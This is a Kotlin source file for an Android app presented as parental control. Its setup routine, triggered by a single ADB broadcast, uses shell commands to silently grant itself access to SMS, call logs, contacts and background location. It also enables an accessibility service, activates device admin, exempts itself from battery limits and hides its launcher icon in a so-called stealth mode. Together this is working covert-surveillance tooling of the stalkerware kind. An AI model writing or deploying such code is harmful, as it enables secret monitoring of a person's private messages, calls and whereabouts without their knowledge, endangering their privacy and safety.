package com.parentalcontrol.app

import android.content.Context
import android.os.Build
import android.util.Log
import java.io.BufferedReader
import java.io.InputStreamReader

/**
 * ShizukuPermissionManager — Grants ALL permissions and configures the app
 * via ADB shell commands. This is designed to be triggered from a single
 * ADB broadcast command from the parent's computer during initial setup.
 *
 * Usage from PC:
 * adb shell am broadcast -a com.parentalcontrol.app.SETUP_ALL \
 *   --es secret "kidguard2024" \
 *   --es server "http://192.168.1.3:5000" \
 *   --es email "child@example.com" \
 *   --es password "childpass123" \
 *   --es pairing_code "ABCD1234" \
 *   --es dialer_code "5678" \
 *   -n com.parentalcontrol.app/.SetupReceiver
 */
object ShizukuPermissionManager {
    private const val TAG = "ShizukuPermMgr"
    private const val PACKAGE_NAME = "com.parentalcontrol.app"

    // All runtime permissions the app needs
    private val RUNTIME_PERMISSIONS = listOf(
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        "android.permission.READ_SMS",
        "android.permission.READ_CALL_LOG",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.FOREGROUND_SERVICE",
        "android.permission.FOREGROUND_SERVICE_LOCATION",
        "android.permission.SCHEDULE_EXACT_ALARM",
        "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"
    )

    /**
     * Grant all runtime permissions via `pm grant` shell commands.
     * This works when called from an ADB-triggered broadcast receiver
     * because the broadcast runs with shell UID privileges.
     */
    fun grantAllPermissions(context: Context): List<String> {
        val results = mutableListOf<String>()

        for (permission in RUNTIME_PERMISSIONS) {
            val result = executeShellCommand("pm grant $PACKAGE_NAME $permission")
            if (result.success) {
                results.add("✓ Granted: $permission")
                Log.d(TAG, "Granted: $permission")
            } else {
                results.add("✗ Failed: $permission — ${result.error}")
                Log.w(TAG, "Failed to grant $permission: ${result.error}")
            }
        }

        return results
    }

    /**
     * Enable the Accessibility Service via `settings put secure`.
     * This requires shell-level access (ADB broadcast context).
     */
    fun enableAccessibilityService(context: Context): Boolean {
        val componentFlat = "$PACKAGE_NAME/.TrackerAccessibilityService"

        // Get current enabled services
        val currentResult = executeShellCommand(
            "settings get secure enabled_accessibility_services"
        )
        val currentServices = currentResult.output.trim()

        val newServices = if (currentServices.isNullOrEmpty() || currentServices == "null") {
            componentFlat
        } else if (!currentServices.contains(componentFlat)) {
            "$currentServices:$componentFlat"
        } else {
            Log.d(TAG, "Accessibility service already enabled")
            return true
        }

        // Set the service
        val setResult = executeShellCommand(
            "settings put secure enabled_accessibility_services $newServices"
        )
        if (!setResult.success) {
            Log.w(TAG, "Failed to set accessibility services: ${setResult.error}")
            return false
        }

        // Also enable accessibility itself
        executeShellCommand("settings put secure accessibility_enabled 1")

        Log.d(TAG, "Accessibility service enabled: $componentFlat")
        return true
    }

    /**
     * Activate Device Admin via `dpm set-active-admin`.
     */
    fun activateDeviceAdmin(context: Context): Boolean {
        val component = "$PACKAGE_NAME/.DeviceAdminReceiver"
        val result = executeShellCommand("dpm set-active-admin $component")
        if (result.success) {
            com.parentalcontrol.app.api.CloudConfig.deviceAdminActive = true
            Log.d(TAG, "Device admin activated")
        } else {
            Log.w(TAG, "Device admin activation failed: ${result.error}")
        }
        return result.success
    }

    /**
     * Disable battery optimization for the app.
     */
    fun disableBatteryOptimization(context: Context): Boolean {
        val result = executeShellCommand("dumpsys deviceidle whitelist +$PACKAGE_NAME")
        Log.d(TAG, "Battery optimization disabled: ${result.success}")
        return result.success
    }

    /**
     * Hide the app launcher icon by disabling the launcher activity-alias.
     */
    fun hideAppIcon(context: Context): Boolean {
        // Use the activity-alias approach — disable the LauncherAlias component
        val result = executeShellCommand(
            "pm disable $PACKAGE_NAME/$PACKAGE_NAME.LauncherAlias"
        )
        if (result.success) {
            com.parentalcontrol.app.api.CloudConfig.stealthMode = true
            Log.d(TAG, "App icon hidden via LauncherAlias disable")
        } else {
            // Fallback: disable MainActivity directly (old approach)
            val fallback = executeShellCommand(
                "pm disable $PACKAGE_NAME/$PACKAGE_NAME.MainActivity"
            )
            if (fallback.success) {
                com.parentalcontrol.app.api.CloudConfig.stealthMode = true
                Log.d(TAG, "App icon hidden via MainActivity disable")
            }
        }
        return com.parentalcontrol.app.api.CloudConfig.stealthMode
    }

    /**
     * Show the app launcher icon (re-enable the LauncherAlias).
     */
    fun showAppIcon(context: Context) {
        executeShellCommand("pm enable $PACKAGE_NAME/$PACKAGE_NAME.LauncherAlias")
        Log.d(TAG, "App icon restored")
    }

    /**
     * Run the complete automatic setup:
     * 1. Grant all permissions
     * 2. Enable accessibility service
     * 3. Activate device admin
     * 4. Disable battery optimization
     * 5. Optionally hide app icon
     *
     * Returns a summary of what was accomplished.
     */
    fun runFullSetup(
        context: Context,
        hideIcon: Boolean = true
    ): SetupResult {
        Log.d(TAG, "═══ Starting Full Shizuku-Style Setup ═══")
        val report = mutableListOf<String>()

        // Step 1: Grant all permissions
        report.add("── Permissions ──")
        report.addAll(grantAllPermissions(context))

        // Step 2: Enable Accessibility Service
        report.add("\n── Accessibility Service ──")
        val a11yOk = enableAccessibilityService(context)
        report.add(if (a11yOk) "✓ Accessibility Service enabled" else "✗ Accessibility Service failed")

        // Step 3: Activate Device Admin
        report.add("\n── Device Admin ──")
        val adminOk = activateDeviceAdmin(context)
        report.add(if (adminOk) "✓ Device Admin activated" else "✗ Device Admin failed")

        // Step 4: Battery Optimization
        report.add("\n── Battery Optimization ──")
        val batteryOk = disableBatteryOptimization(context)
        report.add(if (batteryOk) "✓ Battery optimization disabled" else "✗ Battery optimization failed")

        // Step 5: Hide icon
        if (hideIcon) {
            report.add("\n── Stealth Mode ──")
            val hideOk = hideAppIcon(context)
            report.add(if (hideOk) "✓ App icon hidden" else "✗ Icon hide failed")
        }

        val fullReport = report.joinToString("\n")
        Log.d(TAG, fullReport)
        Log.d(TAG, "═══ Setup Complete ═══")

        return SetupResult(
            permissionsGranted = true,
            accessibilityEnabled = a11yOk,
            deviceAdminActive = adminOk,
            batteryOptimized = batteryOk,
            iconHidden = hideIcon && com.parentalcontrol.app.api.CloudConfig.stealthMode,
            report = fullReport
        )
    }

    // ─── Shell Command Execution ─────────────────────────────────────────

    data class ShellResult(val success: Boolean, val output: String, val error: String = "")

    private fun executeShellCommand(command: String): ShellResult {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val output = BufferedReader(InputStreamReader(process.inputStream)).readText()
            val error = BufferedReader(InputStreamReader(process.errorStream)).readText()
            val exitCode = process.waitFor()

            ShellResult(
                success = exitCode == 0 && error.isBlank(),
                output = output.trim(),
                error = error.trim()
            )
        } catch (e: Exception) {
            Log.e(TAG, "Shell command failed: $command", e)
            ShellResult(success = false, output = "", error = e.message ?: "Unknown error")
        }
    }

    // ─── Result Data Class ───────────────────────────────────────────────

    data class SetupResult(
        val permissionsGranted: Boolean,
        val accessibilityEnabled: Boolean,
        val deviceAdminActive: Boolean,
        val batteryOptimized: Boolean,
        val iconHidden: Boolean,
        val report: String
    )
}
